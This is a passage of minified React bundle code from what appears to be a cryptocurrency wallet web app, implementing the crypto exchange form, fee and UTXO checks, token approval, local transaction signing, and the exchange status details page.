            O.useMemo)(( () => D ? D.currency : null), [D])
              , ht = (0,
            O.useMemo)(( () => !we && !Ce), [we, Ce])
              , yt = (0,
            O.useMemo)(( () => (null == D ? void 0 : D.uuid) !== (null == Y ? void 0 : Y.uuid)), [null == Y ? void 0 : Y.uuid, null == D ? void 0 : D.uuid])
              , vt = le && (0,
            Ko.lt)(le, X) ? le : X
              , _t = (0,
            O.useMemo)(( () => !!(D && D.family && ye) && (["eth", "btc", "trx"].includes(D.family) && yt)), [D, yt, ye, ge])
              , wt = (0,
            O.useMemo)(( () => !te && !_t && !(0,
            Ko.eq)(U, 0) && !Number.isNaN(X) && Y && (0,
            Ko.gt)(null != ee && ee.extraFee && X ? (0,
            Ko.PD)(X, null == ee ? void 0 : ee.extraFee) : X, Y.balance)), [U, X, Y, yt, _t, te])
              , bt = (0,
            O.useMemo)(( () => D && B && Y ? (null == D ? void 0 : D.hw) || (null == Y ? void 0 : Y.hw) : null), [Y, D, B]);
            (0,
            O.useEffect)((function setShowFeeErrorAndDusterConfirm() {
                Ae(!1);
                s(Fu.setMainPageStep(U4.WAIT_FOR_EXCHANGE))
            }
            ), [U]);
            const kt = (0,
            O.useMemo)(( () => {
                if (Y)
                    return !!X && yt && (0,
                    Ko.gt)(X, Y.balance)
            }
            ), [X, Y, yt])
              , St = (0,
            O.useMemo)(( () => "eth" === (null == Y ? void 0 : Y.currency) || "btc" === (null == Y ? void 0 : Y.currency) || "trx" === (null == Y ? void 0 : Y.currency)), [Y])
              , handleUpdateBalance = e => async () => {
                await s(updateBalanceByWallet(e, !1))
            }
            ;
            (0,
            O.useEffect)((function onHandleNextStep() {
                if (ge !== U4.SHOW_NEXT_PAGE)
                    return;
                if (se && ie)
                    return;
                s(Fu.setMainPageStep(U4.SENDING_ASSETS));
                const e = {
                    amount: (null == he ? void 0 : he.fromAmount) || (0,
                    Ko.y4)(U),
                    estimate: (null == he ? void 0 : he.toAmount) || p || "",
                    fee: vt,
                    resource: te || "",
                    walletFrom: null == D ? void 0 : D.uuid,
                    p: y,
                    minAmount: m.minimal,
                    exchangeId: (null == he ? void 0 : he.id) || "",
                    invoiceId: Ee || "",
                    addressTo: Ue,
                    currencyTo: (null == B ? void 0 : B.currency) || (null == B ? void 0 : B.ticker)
                }
                  , t = (0,
                Ko.FH)(xe(U, D, "usd"), {
                    max: 4
                })
                  , a = cc.$.txPerformanceStart()
                  , startSendTransaction = async () => {
                    if (Ee)
                        await handleDustTransaction({
                            txStart: a,
                            exchangeTransaction: he,
                            toWallet: B,
                            detailsPageParams: e,
                            fee: X,
                            fromWallet: D,
                            feeWallet: Y,
                            captchaCode: w,
                            feeExtraData: re,
                            dispatch: s
                        });
                    else {
                        await handleUpdateBalance(D);
                        const a = {
                            address: null == he ? void 0 : he.addressDeposit,
                            currency: null == B ? void 0 : B.currency
                        };
                        let n = {
                            amount: null != e && e.amount ? String(e.amount) : "",
                            amountInUsd: t,
                            currencyTo: null == B ? void 0 : B.currency,
                            isFeeIncluded: !1,
                            extraId: (null == he ? void 0 : he.payinExtraId) || (null == he ? void 0 : he.extraIdDeposit),
                            estimate: e.estimate,
                            fee: e.fee,
                            exchangeId: e.exchangeId
                        };
                        re && (n = Object.assign(n, re));
                        const r = await tM.send("exchange", D, a, Y, n, q);
                        s(Fu.setSendAssetsResponse(r))
                    }
                    const n = `${null == D ? void 0 : D.currency}/${null == B ? void 0 : B.currency}`
                      , r = cc.$.txPerformanceEnd(a);
                    cc.$.send(cc.d.PERFORMANCE_TX_EXCHANGE, n, `${r} ms`);
                    A || redirectToDetails()
                }
                ;
                startSendTransaction()
            }
            ), [ge]);
            const redirectToDetails = () => {
                const e = {
                    amount: (null == he ? void 0 : he.fromAmount) || (0,
                    Ko.y4)(U),
                    estimate: (null == he ? void 0 : he.toAmount) || p || "",
                    fee: vt,
                    resource: te || "",
                    walletFrom: null == D ? void 0 : D.uuid,
                    p: y,
                    minAmount: m.minimal,
                    exchangeId: A && (null == u ? void 0 : u.orderId) || (null == he ? void 0 : he.id) || "",
                    invoiceId: Ee || "",
                    addressTo: Ue,
                    currencyTo: (null == B ? void 0 : B.currency) || (null == B ? void 0 : B.ticker)
                };
                if (b === M4.xS.TYPE_EXCHANGE_ADDRESS) {
                    null != B && B.title && Object.assign(e, {
                        walletToTitle: null == B ? void 0 : B.title
                    });
                    null != B && B.family && Object.assign(e, {
                        familyTo: null == B ? void 0 : B.family
                    })
                }
                b === M4.xS.TYPE_EXCHANGE_WALLET && Object.assign(e, {
                    walletTo: null == B ? void 0 : B.uuid
                });
                const t = (0,
                Ko.FH)(xe(U, D, "usd"), {
                    max: 4
                });
                t && Object.assign(e, {
                    amountInUsd: t
                });
                te && Object.assign(e, {
                    resource: te
                });
                const a = toHashUrlParams(e);
                i.push({
                    pathname: (0,
                    M.RU)("/exchange/details"),
                    search: objectToString({
                        ...e,
                        urlid: a
                    })
                })
            }
            ;
            (0,
            O.useEffect)((function onClearStore() {
                return () => {
                    s(Fu.setClearExchangeStore())
                }
            }
            ), []);
            const Ct = (0,
            O.useCallback)(( () => {
                if (!m.minimal)
                    return null;
                if (yt)
                    return m.minimal;
                const e = te ? 0 : X;
                return (0,
                Ko.PD)(m.minimal, (0,
                Ko.$q)(e || 0, 1.5))
            }
            ), [X, yt, m.minimal, te])
              , Nt = (0,
            O.useMemo)(( () => f && ht && Et && B && D && Y && U && !E && !J && (p || Me || fe) && (X || Q)), [f, ht, Et, B, D, Y, U, E, J, p, Me, fe, X, Q]);
            (0,
            O.useEffect)(( () => {
                if (fe === Ei) {
                    Ae(!0);
                    const {isValid: e} = o.current.validate();
                    if (!e) {
                        H(!0);
                        return
                    }
                }
            }
            ), [fe]);
            const {isBtcNoValidUtxoWarning: Tt, isBtcDustUtxoWarning: At} = useCheckBtcUtxo({
                addressTo: null !== (n = null == he ? void 0 : he.addressDeposit) && void 0 !== n ? n : null == B || null === (r = B.data) || void 0 === r ? void 0 : r.address,
                fee: X,
                amount: U,
                fromWallet: D,
                feePerByte: null == ee ? void 0 : ee.feePerByte
            });
            (0,
            O.useMemo)(( () => {
                null != u && u.orderId && redirectToDetails();
                return u
            }
            ), [u]);
            const handleCreateOrderInfo = async (e, t) => {
                var a, n, r, l, i, o;
                await createOrderInfoFunction({
                    fromCurrency: null == D || null === (a = D.data) || void 0 === a ? void 0 : a.currency,
                    fromNetwork: (null == D || null === (n = D.data) || void 0 === n ? void 0 : n.family) || "eth",
                    toCurrency: null == B || null === (r = B.data) || void 0 === r ? void 0 : r.currency,
                    toNetwork: (null == B || null === (l = B.data) || void 0 === l ? void 0 : l.family) || "eth",
                    fromAmount: U,
                    address: null == B || null === (i = B.data) || void 0 === i ? void 0 : i.address,
                    addressFrom: null == D || null === (o = D.data) || void 0 === o ? void 0 : o.address,
                    hash: e,
                    fee: t,
                    partner: null != y ? y : Ai,
                    amountOutMin: (null == d ? void 0 : d.amountOutMin) || "0",
                    dispatch: s
                });
                return "EndOfHandleCreate"
            }
              , handleSign = async () => {
                var e, t, a;
                if (null != he && null !== (e = he.txData) && void 0 !== e && e.data && null != he && null !== (t = he.txData) && void 0 !== t && t.to && null != he && null !== (a = he.txData) && void 0 !== a && a.value) {
                    var n;
                    const e = await Se.Z.getApiByWallet(D)
                      , t = {
                        privateKey: null === (n = D.data) || void 0 === n ? void 0 : n.privateKey,
                        txData: he.txData
                    }
                      , a = await e.signAndSendTransaction(t);
                    await handleCreateOrderInfo(null == a ? void 0 : a.transactionHash, String(null == a ? void 0 : a.cumulativeGasUsed) || "0");
                    return a
                }
            }
            ;
            (0,
            O.useMemo)(( () => he ? he.txData && Object.keys(he.txData).length > 0 ? handleSign() : he : "error"), [he]);
            const handleApprove = async () => {
                if (!x) {
                    W(!1);
                    if (P)
                        return "Approved";
                    I(!0);
                    try {
                        var e, t, a, n, r;
                        if (!D || Number(null === (e = D.data) || void 0 === e ? void 0 : e.balance) <= 0 || Number(ae) <= 0 || Number(U) > Number(ae))
                            return;
                        if (null === (t = D.data) || void 0 === t || !t.smartContract) {
                            L(!0);
                            return
                        }
                        const l = await Se.Z.getApiByWallet(D)
                          , s = {
                            chainName: D.family || "eth",
                            tokenContractAddress: null === (a = D.data) || void 0 === a ? void 0 : a.smartContract,
                            walletAddress: null === (n = D.data) || void 0 === n ? void 0 : n.address,
                            privateKey: null === (r = D.data) || void 0 === r ? void 0 : r.privateKey,
                            requiredAmount: U
                        }
                          , i = await l.checkAndApproveTransaction(s);
                        L(!0);
                        return i
                    } catch (e) {
                        W(!0)
                    } finally {
                        I(!1)
                    }
                }
            }
              , handleNext = () => {
                if (He) {
                    $e(!0);
                    return
                }
                if (!(K || b !== M4.xS.TYPE_EXCHANGE_ADDRESS || Ve && Ue)) {
                    Ye(!0);
                    return
                }
                Ye(!1);
                Ae(!0);
                H(!1);
                const {isValid: e} = o.current.validate();
                if (!e || At || Tt) {
                    H(!0);
                    (Tt || At) && Z(!0)
                } else {
                    s(Fu.setExchangeError(""));
                    if (ge !== U4.WAIT_DUSTER_CONFIRM) {
                        if (!wt && Nt && !(!D || !B || !Y || he && ge !== U4.WAIT_FOR_EXCHANGE || J || Q || !X && 0 !== X) && p) {
                            me(!0);
                            pe.current = window.setInterval(( () => {
                                ue((e => e - 1))
                            }
                            ), 1e3)
                        }
                    } else
                        s(Fu.setMainPageStep(U4.SHOW_NEXT_PAGE))
                }
            }
            ;
            (0,
            O.useEffect)((function onCreatExchangeTx() {
                if (0 === ce) {
                    handleUndoExecution();
                    const e = Boolean(kt && St && ye);
                    createExchangeTx({
                        fromWallet: D,
                        toWallet: B,
                        feeWallet: Y,
                        isLoadingFee: J,
                        isFeeError: Boolean(Q),
                        fee: vt,
                        creatingExchangeTx: ge === U4.CREATING_EXCHANGE_TX,
                        amount: U,
                        partner: null != y ? y : Ai,
                        isWithDuster: e,
                        dispatch: s,
                        addressTo: Ue,
                        exchangeType: b,
                        quotaId: h,
                        resource: te,
                        amountOutMin: g
                    })
                }
            }
            ), [U, ge, s, he, X, Y, D, Q, J, y, ce, B, kt, St]);
            const xt = {
                precision: ne >= 0 ? ne : null,
                min: Ct(),
                max: m.maximal ? m.maximal : null,
                available: ae,
                isFullErrorMessage: !0,
                currency: Et,
                isAmountOutOfRange: fe === Ei
            }
              , It = (0,
            O.useMemo)(( () => !(f && ht) && Et && B || Me), [Et, Me, ht, f, B])
              , handleRedirectToBuy = () => {
                s(setActiveWallet(Y));
                i.push({
                    pathname: (0,
                    M.RU)("/buy")
                })
            }
              , Pt = (0,
            O.useMemo)(( () => Te && (wt || fe === pi || !ye && ge === U4.WAIT_FOR_EXCHANGE)), [fe, ge, ye, wt, Te])
              , Lt = (0,
            O.useMemo)(( () => formatNumberPosition(p || "")), [p])
              , Ft = (0,
            O.useMemo)(( () => toFormatInputNumber(U)), [U]);
            return O.createElement("div", null, O.createElement("div", {
                className: Ht()(F1, {
                    [W1]: !De
                })
            }, De && O.createElement(DashboardMenu, null), O.createElement("div", {
                className: M1
            }, O.createElement(sf(), {
                ref: o
            }, !De && O.createElement("h1", {
                className: O1
            }, "Exchange Crypto"), De && O.createElement(label, null, "I have"), O.createElement(lf.ValidatorField, {
                value: (0,
                Ko.y4)(U),
                rules: [...zf.walletFrom(D), ...zf.amount(xt)]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isNewDesign: !0,
                    isInvalid: f && ht && !t && (K || (null == a ? void 0 : a.includes("Reduce the number (max"))),
                    message: f && ht && a || "",
                    handleChangeAmount,
                    minValue: (0,
                    Ko.y4)(xt.min),
                    className: y2,
                    customInputStyle: v2,
                    withOverflow: !0,
                    top: -22,
                    right: 25
                }, O.createElement("span", null, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    title: De ? "" : "I have",
                    onChange: handleChangeAmount,
                    value: null != U ? U : V4,
                    isInvalid: !t && K,
                    fiat: D && D.currency,
                    customWrapper: Ht()(r2),
                    customWrapperCurrencies: U1,
                    onEnter: handleNext,
                    isSelectorWithValue: !0,
                    isFormatNumberPosition: !0
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: D,
                    onChange: dt,
                    wallets: Pe,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, [""], {
                        exchangesCurrencies: _
                    }),
                    exchangesCurrencies: !0,
                    inputWrapperClassName: w2,
                    customWrapperList: s2,
                    isNewSelector: !0,
                    isSelectorWithValue: !0,
                    newArrow: !0
                }))))
            }
            )), O.createElement(misk_info, {
                className: o2
            }, O.createElement(MiskInfoTitle, {
                className: c2
            }, "Available:"), O.createElement(MiskInfoValue, {
                disabled: !ae,
                onClick: handleSetAllAmount
            }, O.createElement("span", {
                className: n2
            }, (0,
            Ko.yF)(Number(null != ae ? ae : "0"))), " ", (0,
            be.xG)(Et || ""))), O.createElement("div", {
                className: Ht()("relative", {
                    [$1]: De
                })
            }, O.createElement("img", {
                src: E3,
                onClick: mt,
                alt: "Swap wallets",
                className: Ht()(Z1, {
                    [J1]: b === M4.xS.TYPE_EXCHANGE_ADDRESS
                })
            })), O.createElement("div", {
                className: d2
            }, O.createElement(label, null, O.createElement(LabelAction, {
                onClick: ft
            }, pt()))), De && O.createElement(label, null, "I want"), O.createElement(lf.ValidatorField, {
                rules: zf.walletTo(),
                value: B
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && K,
                    message: a,
                    isNewDesign: !0,
                    customInputStyle: v2,
                    className: y2,
                    withOverflow: !0,
                    top: -22,
                    right: 25
                }, O.createElement("span", null, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    title: De ? "" : "I want",
                    withTooltip: !0,
                    value: !Nt || Me || fe && fe !== fi || "0" === U ? "-" : Lt,
                    disabled: !0,
                    isInvalid: !t && K,
                    fiat: B && B.currency,
                    customWrapper: Ht()(r2, {
                        [i2]: !De
                    }),
                    customWrapperCurrencies: U1,
                    isSelectorWithValue: !0,
                    isLoading: (E || J && !!Number(U) || !Nt && !!Number(Ft)) && !!D && !!B && (!!Number(Ft) || E) && fe !== fi && fe !== Ei
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: B,
                    onChange: ut,
                    wallets: Re,
                    isRenderAllExchangeCoinsAndTokens: b === M4.xS.TYPE_EXCHANGE_ADDRESS,
                    listOfAllExchangeAssets: We,
                    exchangesCurrencies: !0,
                    isRenderAllCoinsAndTokens: !0,
                    newTokens: b === M4.xS.TYPE_EXCHANGE_WALLET ? Be : [],
                    newCoins: b === M4.xS.TYPE_EXCHANGE_WALLET ? Oe : [],
                    inputWrapperClassName: w2,
                    customWrapperList: s2,
                    isNewSelector: !0,
                    notSortByCmc: !0,
                    isSelectorWithValue: !0,
                    newArrow: !0,
                    isLoading: S
                }))))
            }
            )), O.createElement("div", {
                className: Ht()("relative", Q1, !(b === M4.xS.TYPE_EXCHANGE_ADDRESS) && J1)
            }, b === M4.xS.TYPE_EXCHANGE_ADDRESS && O.createElement(O.Fragment, null, O.createElement(pa, {
                isSelect: !0,
                isInvalid: !1
            }, O.createElement(mE, {
                value: Ue,
                wallet: B,
                onValidate: st,
                onPartnerAddress: ct,
                onAdapterError: it,
                adapterError: He,
                onLoadingRecognize: ot,
                onChange: rt,
                onEnter: handleNext,
                className: Ze ? S2 : "",
                customPlaceholder: qe,
                disabled: de || ve
            })), !Ue && O.createElement(qr_scanner_paste_button, {
                setAddress: Ge
            }), !at && D && (et || Qe) && O.createElement("div", {
                className: z2.recognizeAddressBlock
            }, O.createElement("span", null, "Recognized ", (0,
            be.xG)(D.currency), " Address:"), O.createElement("p", null, et || Qe)))), O.createElement(ExchangeRateInfo, {
                fromWallet: D,
                toWallet: B,
                feeWallet: Y,
                fee: X,
                estimate: p,
                amount: (0,
                Ko.y4)(U),
                parentWalletTitle: getParentWalletTitle({
                    fromWallet: D,
                    feeWallet: Y,
                    getParent: Ie
                }),
                resource: te,
                notShowValues: !Nt,
                isFeeError: Boolean(Q)
            }), !!y && O.createElement("div", {
                className: Ht()("relative", P2, !y && J1)
            }, O.createElement("h2", {
                className: L2
            }, "Provider"), O.createElement("div", {
                className: F2
            }, O.createElement("div", {
                className: W2
            }, O.createElement("img", {
                src: A ? L4 : F4,
                alt: "providerIcon"
            })), O.createElement("div", {
                className: R2
            }, O.createElement("span", {
                className: B2
            }, A ? "Bridgers" : "Change NOW"), O.createElement("div", {
                className: O2
            }, A ? "Decentralized Exchange" : "Centralized Exchange", A ? O.createElement("img", {
                src: W4,
                alt: "InfoIcon",
                className: M2
            }) : null, A ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: D2
            }, O.createElement("div", {
                className: U2
            }, "No personal verification required."))) : null)))), _e && O.createElement(D4, {
                wallet: Y
            }), "swft" !== y || P ? null : O.createElement(O.Fragment, null, O.createElement("div", {
                className: G2
            }, O.createElement(ui_message, {
                type: "info"
            }, "Allow access to ", U, " ", null == Et ? void 0 : Et.toLocaleUpperCase()))), _e && O.createElement("div", {
                className: z2.captcha
            }, O.createElement(Mm, {
                onCaptcha: e => handleCaptcha(e, s)
            })), O.createElement("div", {
                className: "relative"
            }, O.createElement(Yl, {
                disabled: ve || x,
                className: Ht()(E2, {
                    [T2]: ve || de
                }),
                onClick: de ? handleUndoExecution : A && !P ? handleApprove : handleNext,
                color: "blue",
                size: "large",
                id: Xe
            }, de ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: B1
            }, O.createElement(loader, {
                className: R1,
                visible: !0,
                width: 24,
                whiteBG: !0
            }), O.createElement("span", {
                className: A2
            }, ce)), !ve && O.createElement("span", {
                className: x2
            }, "Undo")) : ve ? O.createElement(loader, {
                className: R1,
                visible: !0,
                width: 24,
                whiteBG: !0
            }) : ge === U4.WAIT_DUSTER_CONFIRM ? O.createElement(O.Fragment, null, "Agree and exchange") : A && !P ? x ? O.createElement("div", {
                className: V2
            }, O.createElement("span", null, "Waiting for approval"), " ", O.createElement(loader, {
                className: R1,
                visible: !0,
                width: 24,
                whiteBG: !0
            })) : O.createElement(O.Fragment, null, "Approve") : O.createElement(O.Fragment, null, "Exchange")), Ze && O.createElement("div", {
                className: Ht()(b2, k2)
            }, "Invalid ", null == B || null === (l = B.currency) || void 0 === l ? void 0 : l.toUpperCase(), " address"), Pt && !_e ? O.createElement("div", {
                className: Ht()(b2, k2)
            }, "Top up", " ", O.createElement("span", {
                className: C2,
                onClick: handleRedirectToBuy
            }, null == Y ? void 0 : Y.title), " ", "wallet to pay network fee") : It && O.createElement("div", {
                className: Ht()(b2, h2)
            }, "This currency pair is not available at the moment. Please try again later or another pair"), (Boolean(fe) || Q) && !It && !Pt && fe !== pi && fe != fi && fe != Ei && O.createElement("div", {
                className: Ht()(b2, k2)
            }, fe || Q && O.createElement(O.Fragment, null, "Can't calculate fee. Please, try again or", " ", O.createElement("a", {
                className: Ht()(C2, N2),
                href: "https://support.guarda.com/",
                target: "_blank",
                rel: "noreferrer"
            }, "contact support")))), F ? O.createElement(O.Fragment, null, O.createElement(ui_message, {
                type: "error"
            }, "Something went wrong during approval")) : null, "sol" === (null == D ? void 0 : D.family) && null != ee && ee.extraFee ? O.createElement(ui_message, {
                type: "info"
            }, "To send to this address, you need to pay a fee of ", ee.extraFee, " SOL for creating a token at this address") : null, ie ? O.createElement(ui_message, {
                type: "error"
            }, `Chosen ${formatTicker(null == B ? void 0 : B.currency)} wallet is inactive –\n              ${formatTicker(null == B ? void 0 : B.currency)} Network requires a deposit to start operations.\n              ${oe} ${formatTicker(null == B ? void 0 : B.currency)} will be spent for activation after the Exchange.`) : null, se ? O.createElement(ui_message, {
                type: "error"
            }, "Transaction results in an account with insufficient funds for rent.", " ", O.createElement("a", {
                href: "https://solana.com/fi/docs/core/rent",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Check out how rent works (What is rent? | Solana ) ", O.createElement(VA, {
                src: uD,
                alt: "Open Link"
            }))) : null, At && z ? O.createElement(DustUtxoRemaining, null) : null, Tt && z ? O.createElement(NoValidUtxo, null) : null, He && je && O.createElement(ui_message, {
                type: "error"
            }, "Network error. Please ", O.createElement("a", {
                onClick: handleRetryLoadAdapter
            }, "try again")), Y && O.createElement(ledger_token_info, {
                parentWallet: Y
            }), bt && fe && O.createElement(ui_message, null, "Please confirm transaction on your ", null == Y ? void 0 : Y.hw, " device"), O.createElement(lf.ValidatorField, {
                value: !!p,
                rules: zf.bool
            }), O.createElement(lf.ValidatorField, {
                value: f,
                rules: zf.bool
            }), O.createElement(lf.ValidatorField, {
                value: ht,
                rules: zf.bool
            })))), O.createElement(_m, {
                type: jd,
                wallet: D,
                className: I2
            }))
        }
          , K4 = {
            wrapper: "exchangeDetailsPage_wrapper_1jM43 exchangeMainPage_wrapper_2X_YZ app_wrapperBlock_2EpA3",
            wrapperForm: "exchangeDetailsPage_wrapperForm_33cJA exchangeMainPage_wrapperForm_2jpds app_wrapperLeftBlock_3QLZp",
            lock: "exchangeDetailsPage_lock_23b_c",
            headerTitle: "exchangeDetailsPage_headerTitle_Rhh2K exchangeMainPage_title_2wb1g",
            infoBlock: "exchangeDetailsPage_infoBlock_1pawJ",
            walletFromInfoBlock: "exchangeDetailsPage_walletFromInfoBlock_9FGAd",
            walletToInfoBlock: "exchangeDetailsPage_walletToInfoBlock_GgM95",
            exchangeDetails: "exchangeDetailsPage_exchangeDetails_2vWpt",
            fromWallet: "exchangeDetailsPage_fromWallet_3DiyC",
            toWallet: "exchangeDetailsPage_toWallet_2L2JM",
            wrapperAmount: "exchangeDetailsPage_wrapperAmount_3Qwts",
            amountExchange: "exchangeDetailsPage_amountExchange_1oSGW",
            text: "exchangeDetailsPage_text_2QGY8",
            copyButton: "exchangeDetailsPage_copyButton_277jl",
            walletTicker: "exchangeDetailsPage_walletTicker_2pA65",
            tooltip: "exchangeDetailsPage_tooltip_uSeqR",
            walletInfo: "exchangeDetailsPage_walletInfo_2e1MQ",
            infoType: "exchangeDetailsPage_infoType_3WCxe",
            walletDescription: "exchangeDetailsPage_walletDescription_3U7PC",
            walletDetailsWrapper: "exchangeDetailsPage_walletDetailsWrapper_1_vNK",
            walletTitle: "exchangeDetailsPage_walletTitle_1QAnm",
            walletAddress: "exchangeDetailsPage_walletAddress_Vxlmm",
            exchangeInfo: "exchangeDetailsPage_exchangeInfo_qiBoQ",
            exchangeID: "exchangeDetailsPage_exchangeID_Yjsnr",
            exchangeIDLink: "exchangeDetailsPage_exchangeIDLink_2cZQE",
            exchangePartner: "exchangeDetailsPage_exchangePartner_jnNtW",
            retryButton: "exchangeDetailsPage_retryButton_2pReY",
            resultBlock: "exchangeDetailsPage_resultBlock_1IY6k",
            progressBar: "exchangeDetailsPage_progressBar_xXpIY",
            separator: "exchangeDetailsPage_separator_338Hg",
            status: "exchangeDetailsPage_status_3-u1j",
            statusNotBegan: "exchangeDetailsPage_statusNotBegan_1vIaV",
            statusError: "exchangeDetailsPage_statusError_1qF_4",
            statusImg: "exchangeDetailsPage_statusImg_3UOju",
            sendingForExchange: "exchangeDetailsPage_sendingForExchange_2Ontl",
            statusWait: "exchangeDetailsPage_statusWait_3AWN1",
            detailsExchangeError: "exchangeDetailsPage_detailsExchangeError_1Tkos",
            statusDone: "exchangeDetailsPage_statusDone_21AVY",
            statusFailed: "exchangeDetailsPage_statusFailed_2zA_K",
            loadingCircle: "exchangeDetailsPage_loadingCircle_3ipL6",
            captcha: "exchangeDetailsPage_captcha_K492X",
            footerBlock: "exchangeDetailsPage_footerBlock_3fIjr",
            buttonsWrapper: "exchangeDetailsPage_buttonsWrapper_3o1c6",
            stepInfo: "exchangeDetailsPage_stepInfo_3yZyh",
            feeInfoToggle: "exchangeDetailsPage_feeInfoToggle_16ISZ",
            loaderWrapper: "exchangeDetailsPage_loaderWrapper_2SJzQ",
            updateBalanceLink: "exchangeDetailsPage_updateBalanceLink_1zUch",
            wrapperCenterForm: "exchangeDetailsPage_wrapperCenterForm_486wo app_wrapperCenterBlock_bcslh",
            userSelect: "exchangeDetailsPage_userSelect_ttAxk"
        }
          , ExchangeStatus = e => {
            let {exchangeStatusType: t, isExchangeToAddress: a} = e;
            const n = (0,
            $.v9)(Ki)
              , r = (0,
            O.useMemo)(( () => {
                const e = n[n.length - 1];
                return e === di ? n[n.length - 2] ? n[n.length - 2] : si : e || si
            }
            ), [n])
              , l = mi.indexOf(t)
              , s = mi.indexOf(r)
              , i = (0,
            O.useMemo)(( () => ({
                isStatusDone: n.includes(mi[l + 1]) || s > l,
                isStatusFailed: isCurrentStatusFailed(t, n),
                isStatusProcessed: n.includes(t) || s >= l
            })), [t, l, s, n])
              , {isStatusDone: o, isStatusFailed: c, isStatusProcessed: u} = i;
            let d;
            switch (t) {
            case si:
                d = O.createElement("div", {
                    className: K4.sendingForExchange
                }, "Sending for", O.createElement("br", null), " exchange");
                break;
            case ii:
                d = O.createElement("div", null, "Confirming");
                break;
            case oi:
                d = O.createElement("div", null, "Exchanging");
                break;
            case ci:
                d = O.createElement("div", null, a ? O.createElement(O.Fragment, null, "Sending ", O.createElement("br", null), " to receiver") : O.createElement(O.Fragment, null, "Sending ", O.createElement("br", null), " to you"));
                break;
            default:
                d = O.createElement(O.Fragment, null)
            }
            return O.createElement("div", {
                className: Ht()(K4.status, {
                    [K4.statusNotBegan]: !u,
                    [K4.statusError]: c
                })
            }, O.createElement("span", {
                className: Ht()(K4.statusImg, {
                    [K4.statusDone]: o,
                    [K4.statusFailed]: c,
                    [K4.statusWait]: !c && !c
                })
            }, O.createElement(loader, {
                visible: r === t && !c,
                className: K4.loadingCircle
            })), d)
        }
        ;
        function ExchangeDetailsPage_ExchangeDetailsPage() {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.v9)($c)
              , r = (0,
            $.v9)(eu)
              , [l,s] = (0,
            O.useState)(!1)
              , i = useLocationSearch()
              , o = i.p
              , c = (0,
            $.v9)(lu)
              , [u,d] = (0,
            O.useState)(!0)
              , [m,p] = (0,
            O.useState)(!1)
              , [f,E] = (0,
            O.useState)("")
              , [h,g] = (0,
            O.useState)(!1)
              , [y,v] = (0,
            O.useState)(!1)
              , _ = (0,
            $.v9)(Ri)
              , w = (0,
            $.v9)(Ki)
              , b = (0,
            $.v9)(zi)
              , k = (0,
            O.useMemo)(( () => w.includes(di)), [w])
              , [S,C] = (0,
            O.useState)(null)
              , [N,T] = (0,
            O.useState)(null)
              , A = (0,
            O.useMemo)(( () => (0,
            Ko.yF)((null == _ ? void 0 : _.amountFrom) || (null == _ ? void 0 : _.expectedAmountFrom) || i.amount)), [_, i])
              , x = (0,
            O.useMemo)(( () => (0,
            Ko.yF)((null == _ ? void 0 : _.amountTo) || (null == _ ? void 0 : _.expectedAmountTo) || i.estimate)), [_, i])
              , I = (0,
            O.useMemo)(( () => A.replace(/\s/g, "")), [A])
              , P = (0,
            O.useMemo)(( () => x.replace(/\s/g, "")), [x])
              , L = (0,
            O.useMemo)(( () => (0,
            M.tq)() || (0,
            M.p1)()), []);
            (0,
            O.useEffect)(( () => {
                getRefData({
                    dispatch: e,
                    setIsRefLinkActivated: p,
                    setLinkId: E
                })
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                if (n.length) {
                    C(r(i.walletFrom));
                    i.walletTo ? T(r(i.walletTo)) : i.addressTo && i.currencyTo && T({
                        currency: i.currencyTo,
                        family: i.familyTo,
                        title: i.walletToTitle
                    })
                }
            }
            ), [n]);
            (0,
            O.useEffect)((function onFetchExchangeTransaction() {
                e(Fu.fetchExchangeTransaction({
                    id: i.exchangeId,
                    partner: o
                }));
                return () => {
                    e(Fu.setClearExchangeStore())
                }
            }
            ), [i.exchangeId]);
            const [F] = fee_wallet(S);
            (0,
            O.useEffect)(( () => {
                e(updateWalletsBalanceAndTxs(S, {
                    isCascade: !0
                }))
            }
            ), []);
            const handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/exchange"),
                    search: a.search
                })
            }
            ;
            function handleUnlockForm(e, t) {
                d(e);
                g(!1);
                t && v(!0)
            }
            const handleStartTransaction = async () => {
                if (u)
                    g(!0);
                else if (null != b && b.error && (null == o ? void 0 : o.toLocaleLowerCase()) !== Ci)
                    e(Fu.addExchangeStatusToHistory(di));
                else {
                    try {
                        await e(updateExchangeTx(i.exchangeId, {
                            payinHash: null == b ? void 0 : b.hash,
                            amountTo: i.estimate,
                            fromFamily: (null == S ? void 0 : S.family) || (null == S ? void 0 : S.currency),
                            toFamily: (null == N ? void 0 : N.family) || (null == N ? void 0 : N.currency)
                        }))
                    } catch {}
                    if (null != b && b.hash) {
                        try {
                            await e(transactions_addPendingTx(b.pendingTx));
                            await e(fetchExchangeTransactions())
                        } catch (e) {}
                        if (m) {
                            const t = {
                                linkId: f,
                                exchangeId: i.exchangeId,
                                partner: o
                            };
                            e(createExchangeWithRewardForRefProg(t));
                            const a = `${f}/${i.exchangeId}`;
                            cc.$.send(cc.d.REFERRAL_CREATE_EXCHANGE_WITH_REWARD, a)
                        }
                    }
                }
            }
            ;
            (0,
            O.useEffect)((function onStartExchangeTx() {
                if (S && N && F && _ && b && !l) {
                    s(!0);
                    handleStartTransaction()
                }
            }
            ), [S, N, F, _, b]);
            (0,
            O.useEffect)(( () => {
                y && handleStartTransaction()
            }
            ), [y]);
            const W = undefined;
            if (!checkHashParams(i))
                return O.createElement("div", {
                    className: K4.wrapper
                }, O.createElement("div", {
                    className: K4.wrapperCenterForm
                }, O.createElement("img", {
                    src: lM,
                    alt: ""
                }), O.createElement("p", null, "Transaction data does not match the information you have entered. Please go back to Step 1 and double-check the information."), O.createElement(Yl, {
                    onClick: handleBack,
                    color: "blue"
